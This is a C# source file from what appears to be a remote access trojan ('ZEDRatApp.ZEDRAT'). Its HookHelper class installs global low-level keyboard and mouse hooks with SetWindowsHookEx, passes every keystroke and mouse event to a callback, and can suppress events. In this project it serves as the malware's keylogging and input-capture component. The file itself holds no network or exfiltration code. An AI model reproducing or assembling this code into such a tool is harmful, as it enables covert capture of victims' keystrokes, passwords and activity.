using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi
{
	internal static class HookHelper
	{
		public static HookResult HookAppMouse(Callback callback)
		{
			return HookHelper.HookApp(7, callback);
		}

		public static HookResult HookAppKeyboard(Callback callback)
		{
			return HookHelper.HookApp(2, callback);
		}

		public static HookResult HookGlobalMouse(Callback callback)
		{
			return HookHelper.HookGlobal(14, callback);
		}

		public static HookResult HookGlobalKeyboard(Callback callback)
		{
			return HookHelper.HookGlobal(13, callback);
		}

		private static HookResult HookApp(int hookId, Callback callback)
		{
			HookProcedure hookProcedure = (int code, IntPtr param, IntPtr lParam) => HookHelper.HookProcedure(code, param, lParam, callback);
			HookProcedureHandle hookProcedureHandle = HookNativeMethods.SetWindowsHookEx(hookId, hookProcedure, IntPtr.Zero, ThreadNativeMethods.GetCurrentThreadId());
			if (hookProcedureHandle.IsInvalid)
			{
				HookHelper.ThrowLastUnmanagedErrorAsException();
			}
			return new HookResult(hookProcedureHandle, hookProcedure);
		}

		private static HookResult HookGlobal(int hookId, Callback callback)
		{
			HookProcedure hookProcedure = (int code, IntPtr param, IntPtr lParam) => HookHelper.HookProcedure(code, param, lParam, callback);
			HookProcedureHandle hookProcedureHandle = HookNativeMethods.SetWindowsHookEx(hookId, hookProcedure, Process.GetCurrentProcess().MainModule.BaseAddress, 0);
			if (hookProcedureHandle.IsInvalid)
			{
				HookHelper.ThrowLastUnmanagedErrorAsException();
			}
			return new HookResult(hookProcedureHandle, hookProcedure);
		}

		private static IntPtr HookProcedure(int nCode, IntPtr wParam, IntPtr lParam, Callback callback)
		{
			if (nCode != 0)
			{
				return HookHelper.CallNextHookEx(nCode, wParam, lParam);
			}
			if (!callback(new CallbackData(wParam, lParam)))
			{
				return new IntPtr(-1);
			}
			return HookHelper.CallNextHookEx(nCode, wParam, lParam);
		}

		private static IntPtr CallNextHookEx(int nCode, IntPtr wParam, IntPtr lParam)
		{
			return HookNativeMethods.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
		}

		private static void ThrowLastUnmanagedErrorAsException()
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
	}
}
